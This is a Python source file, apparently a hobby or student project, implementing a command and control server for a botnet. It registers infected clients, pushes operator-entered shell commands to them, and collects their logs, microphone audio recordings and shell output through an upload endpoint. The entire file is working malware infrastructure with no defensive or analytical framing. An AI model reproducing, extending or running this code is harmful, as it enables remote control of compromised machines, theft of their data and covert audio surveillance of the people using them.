# /usr/env/python
# commandandcontrol.py
# Thomas Wygonik
# A python program that acts as a simple command and control server for a botnet


from http.server import BaseHTTPRequestHandler, HTTPServer
import re
import os
import threading
import time
import hashlib

message = "Server Response"  # Dummy variable
Clients = {}
currentCommand = ""  # the current command for clients to run
currentValue = ""  # if required, the current value for a command
commandList = ["list", "runshell", "getlog", "getaudio", "exit"]
numCheckin = 0  # the number of clients that have checked in after a command was executed


class Client:
    """
    The client class stores data about a specific client
    :param String id: The client's UUID
    :param bool connected: is the client connected true/false
    :param long checkinTime: The last time since epoch that a client checked in
    :param String ip: the IP address a client checked in from
    """

    def __init__(self, id, connected, checkinTime, ip):
        self.id = id
        self.connected = connected
        self.lastCheckin = checkinTime
        self.ip = ip

    def getid(self):
        return self.id

    def getconnected(self):
        return self.connected

    def getcheckintime(self):
        return self.lastCheckin

    def getip(self):
        return self.ip

    def setconnected(self, conn):
        self.connected = conn

    def setcheckintime(self, time):
        self.lastCheckin = time


class S(BaseHTTPRequestHandler):
    """
    This is an HTTP class that handles all of the communication between server and client
    Note: all connections utilize POST instead of GET
    """

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        content_length = int(self.headers['Content-Length'])
        get_data = self.rfile.read(content_length)
        self._set_headers()
        html = message.encode()
        self.wfile.write(html)

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        """
        function where all the logic occurs
        :return: None
        """
        global currentCommand
        global Clients
        if self.path == '/connect':
            # if the directory is /connect, call the connect function to handle the logic
            connect(self)
        elif self.path == "/checkin":
            # if the directory is /checkin, call the checkin function to handle the logic
            checkin(self)
        elif self.path == '/fileupload':
            # if the directory is /fileupload, call fileupload function to handle file logic
            fileupload(self)

        else:
            content_length = int(self.headers['Content-Length'])  # get size of data
            post_data = self.rfile.read(content_length)
            print(post_data.decode())
            self._set_headers()
            html = message.encode()
            self.wfile.write(html)

    def log_message(self, format, *args):
        return args


def connect(self):
    """
    this function handles the logic for when a client first connects to the server
    :param self: the client class
    :return: none
    """
    ip_addr = self.address_string()
    content_length = int(self.headers['Content-Length'])  # this is setting up for reading the data
    post_data = self.rfile.read(content_length)
    data = post_data.decode()  # decode the data from byte format
    data = data.split('=')  # split the value: the only the data client should be sending is UUID="client's uuid"
    self._set_headers()
    if data[0] == "UUID":
        clientUUID = data[1]
        if checkUUID(clientUUID) == "MISSING":  # if the UUID is valid but not in the Clients dictionary we add it
            client = Client(clientUUID, True, time.time(), ip_addr)  # setting the client class parameters
            Clients[clientUUID] = client  # the key for the dictionary is the UUID
            self.wfile.write("OK".encode())  # telling the client OK
            self.send_response(200)
            print("\n%s Connected Successfully! from ip %s" % (clientUUID, ip_addr))
            if not os.path.exists(clientUUID):
                try:
                    os.mkdir(clientUUID)  # if the path for the client UUID does not exist, we create it
                except OSError as exc:  # Race condition
                    raise exc
        elif checkUUID(clientUUID) == "GOOD":  # if the UUIDcheck indicates GOOD, the client has already connected
            Clients[clientUUID].setconnected(True)
            Clients[clientUUID].setcheckintime(time.time())
            print("\n%s Reconnected from ip %s" % (clientUUID, ip_addr))
            self.wfile.write("CONNECTED".encode())  # tell the client it's already connected
            self.send_response(200)
        else:
            self.wfile.write("BAD REQUEST".encode())  # if the string is not in UUID format, we send back a bad request
            self.send_response(400)
    else:
        self.wfile.write("BAD REQUEST".encode())  # if the first string is not UUID, we send back the request is bad
        self.send_response(400)


def checkin(self):
    """
    This function handles the logic for when a client checks in to run a command
    if there's no command for it to run, the server sends back OK and the client waits 30 secs for the next checkin
    :param self:
    :return:
    """
    global Clients
    global currentValue
    content_length = int(self.headers['Content-Length'])
    post_data = self.rfile.read(content_length)
    data = post_data.decode()
    data = data.split('=')
    self._set_headers()
    if data[0] == "UUID":
        clientUUID = data[1]
        if checkUUID(clientUUID) == "GOOD":
            Clients.get(clientUUID).setconnected(True)
            Clients.get(clientUUID).setcheckintime(time.time())
            if not currentCommand == "" and not currentCommand == "list":
                clientData = "CONNECTED:"
                clientData += "command=" + currentCommand
                if not currentValue == "":
                    currentValue = str(currentValue)
                    clientData += "&value=" + currentValue
                self.wfile.write(clientData.encode())
                self.send_response(200)
            else:
                self.wfile.write("OK".encode())
                self.send_response(200)
        else:
            self.wfile.write("BAD REQUEST".encode())
            self.send_response(400)
    else:
        self.wfile.write("BAD REQUEST".encode())
        self.send_response(400)


def fileupload(self):
    """
    We don't need multiple file directories,
    the client specifies the file type on  a command
    by command basis
    :param self: the class
    :return: none
    """
    global numCheckin
    if currentCommand == "getlog" or currentCommand == "getaudio" or currentCommand == "runshell":
        length = self.headers['content-length']
        self._set_headers()
        data = self.rfile.read(int(length))
        data = data.split("******".encode())
        fileData = data[1]
        metadata = data[0].decode().split("&")
        uuid = metadata[0].split('=')
        filename = metadata[1].split('=')
        sha256Checksum = metadata[2].split('=')
        if uuid[0] == "UUID" and filename[0] == "filename" and sha256Checksum[0] == "sha256":
            uuid = uuid[1]
            if checkUUID(uuid) == "GOOD":
                filename = filename[1]
                sha256Checksum = sha256Checksum[1]
                filepath = uuid + "/" + filename
                with open(filepath, 'wb') as fh:
                    fh.write(fileData)
                hash = hashfile(filepath)
                if hash == sha256Checksum:
                    print("Got %s successfully from %s" % (filename, uuid))
                    self.wfile.write("OK".encode())
                    self.send_response(200)
                    numCheckin += 1
                else:
                    self.wfile.write("RESEND".encode())
                    self.send_response(409)
            else:
                self.wfile.write("BAD REQUEST".encode())
                self.send_response(400)
        else:
            self.wfile.write("BAD REQUST".encode())
            self.send_response(400)
    else:
        self.wfile.write("BAD REQUEST".encode())
        self.send_response(400)


def checkUUID(UUID):
    """
    checks that the specified UUID is valid
    :param UUID: UUID
    :return: GOOD if UUID is valid and already in Clients, Missing if it is not in Clients, BAD if the UUID is in an
            improper format
    """
    pattern = re.compile("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$")
    if pattern.match(UUID):
        if UUID in Clients:
            return "GOOD"
        else:
            return "MISSING"
    else:
        return "BAD"


def hashfile(filename):
    """
    Creates a sha256 hash out of a file
    used to verify file integrity after file transfer
    :param filename: the file to hash
    :return: a string containing the sha256 hash of the file
    """
    hash_sha = hashlib.sha256()
    with open(filename, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_sha.update(chunk)
    return hash_sha.hexdigest()


def checkClients():
    """
    Checks the last time each client checked in
    If the last time a client checked in is greater than 60 seconds,
    we mark the client as being disconnected
    :return:
    """
    global Clients
    global numCheckin
    if len(Clients) != 0:  # if we have clients connected
        for uuid in Clients:
            client = Clients.get(uuid) # get the client class for that uuid
            clientTime = client.getcheckintime() # last time client checked in
            currentTime = time.time() # current time
            elapsed = currentTime - clientTime # time elapsed
            if elapsed > 60.0: # if the time elapsed greater than 60 seconds
                client.setconnected(False) # mark client as disconnected
                print(client.getid(), "Has disconnected!") # print to screen
                numCheckin += 1 # increase number checkin so input does not hang waiting for disconnected client
    else:
        pass


def run(server_class=HTTPServer, handler_class=S, port=80): # arguments for the run function
    server_address = ("0.0.0.0", port) # listen on all addresses and port 80
    httpd = server_class(server_address, handler_class) # create a new server class
    print("Starting http server...")
    input_handler = threading.Thread(target=handle_input, args=(httpd,)) # run server on a thread
    input_handler.start() # start the thread
    httpd.serve_forever() # serve HTTP forever (until told to shutdown)


def handle_input(httpd):
    global currentCommand
    global currentValue
    global numCheckin
    loop = True
    timer = threading.Timer(60.0, checkClients) # check client connection status every 60 seconds
    timer.start()
    print("Possible Commands")
    while loop:
        for printCmd in commandList: # print the possible commands you can run
            print(printCmd, end=" ")
        print()
        tempCommand = input("command: ") # take input for a command
        if tempCommand in commandList: # if the command is in the list of commands
            tempCommand = tempCommand.lower() # convert to lower
            currentCommand = tempCommand
            if currentCommand == "exit": # shutdown the thread and exit the program
                loop = False
                print("Shutting down httpd server")
                httpd.shutdown()
                print("Goodbye!")
                timer.cancel()
                exit(0)
            elif currentCommand == "list": # list each client and their connection status
                print("Number of clients: %d" % len(Clients))
                print("List of clients and connection status")
                if len(Clients) != 0:
                    for client in Clients:
                        print(Clients.get(client).id, "Connected" if Clients.get(client).connected else "Offline")
                currentCommand == ""
            elif currentCommand == "getlog": # set currentcommand to getlog, fileupload and checkin handle the logic
                if len(Clients) == 0:
                    print("Please wait for clients to connect!")
                else:
                    print("Please wait for all clients to check in...")
                    while numCheckin != len(Clients): # wait for all clients to check in
                        pass
                    print("All clients have sent logs")
                    numCheckin = 0 # reset
                    currentCommand = ""
            elif currentCommand == "getaudio": # set currentcommand to get audio, fileupload and checkin functions handle the logic
                if len(Clients) == 0:
                    print("Please wait for clients to connect!")
                else:
                    innerloop = True
                    while innerloop:
                        tempvalue = input("Record for how long in seconds? Default 10: ") # Note: clientside this may be broken
                        if tempvalue.isdigit(): # check that the value entered is an integer
                            currentValue = tempvalue
                            innerloop = False
                        elif tempvalue == "":
                            currentValue = 10
                            innerloop = False
                        else:
                            print("Number of seconds must be an integer")
                    print("Please wait for all clients to check in...")
                    while numCheckin != len(Clients):
                        pass
                    print("All clients have sent audio")
                    numCheckin = 0 # reset
                    currentCommand = ""
                    currentValue = ""
            elif currentCommand == "runshell": # set currentcommand to runshell, fileupload and checkin handle the logic
                if len(Clients) == 0:
                    print("Please wait for clients to connect")
                else:
                    currentValue = input("Shell Command: ")
                    if currentValue != "":
                        print("Please wait for all clients to check in...")
                        while numCheckin != len(Clients):
                            pass
                        print("All clients have sent shell output")
                        numCheckin = 0 # reset
                        currentCommand = ""
                        currentValue = ""
                    else:
                        print("Please input a shell command")
            else:
                print(tempCommand + "\n") # used for testing
        elif tempCommand == "":
            pass # do nothing
        else:
            print("Command %s does not exist!\n" % tempCommand) # your command doesn't exist


if __name__ == "__main__":
    from sys import argv
    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
